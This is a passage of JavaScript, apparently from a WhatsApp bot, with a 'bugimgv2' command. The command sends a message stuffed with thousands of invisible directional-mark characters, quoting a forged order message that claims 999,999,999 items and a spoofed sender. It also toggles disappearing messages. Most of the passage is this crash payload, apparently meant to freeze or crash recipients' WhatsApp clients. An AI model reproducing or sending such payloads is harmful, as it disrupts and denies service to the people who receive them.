‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏
`
kurzxd.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`hm/virgam.jpeg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`hm/virgam.jpeg`),"itemCount":999999999,"status":"INQUIRY","surface":"CATALOG","message":` BODY `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},caption: lzain,contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
break
case 'bugimgv2':
await kurzxd.toggleDisappearingMessages(from)
wew = fs.readFileSync(`./hm/vvirgamv2.jpeg`)
lzain = `
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏